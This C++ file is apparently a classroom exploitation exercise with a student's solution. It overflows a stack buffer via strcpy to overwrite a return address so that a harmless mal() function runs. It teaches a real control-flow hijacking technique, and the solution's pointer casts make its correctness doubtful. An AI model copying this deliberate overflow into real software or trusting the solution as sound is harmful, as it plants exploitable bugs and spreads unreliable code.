#include <iostream>
#include <Windows.h>

void mal()
{
	printf("Success!\n");
	ExitProcess(0);
}

void swap(int* a, int* b)
{
	int temp = *a;
	*a = *b;
	*b = temp;
}

int main()
{
	int a = 5;
	int b = 7;
	int* a_ptr = &a;
	int* b_ptr = &b;

	printf("%d, %d\n", *a_ptr, *b_ptr);

	try
	{
		// Scope 1:
		{
			// Your goal is to cause mal() to execute when the code within scope 2 happens.
			// You are not allowed to change any line of code, only to add code within this scope. 

			// Write your code here.
      
      // Written by Itai Gu.
      // I chose to use stack overflow attack.
      
      char buffer[25];

			for (int i = 0; i < 20; i++)
				buffer[i] = 0x01;

			/* Get mal() void address */
			std::size_t mal_address = reinterpret_cast<std::size_t>(mal);

			int* pRetAddress = (int*)&(buffer[20]);
			*pRetAddress = mal_address;
			buffer[24] = (char)0x00;

			//

			char buf[16];
			strcpy(buf, buffer);

			*b_ptr = *buf;
		}

		// When this scope executes mal() should be called.
		// Don't change the code here!
		// Scope 2:
		{
			swap(a_ptr, b_ptr);
			printf("%d, %d\n", *a_ptr, *b_ptr);
		}
	}
	catch (...) {
		printf("Failure :("); // If this executes you fail
	}
}
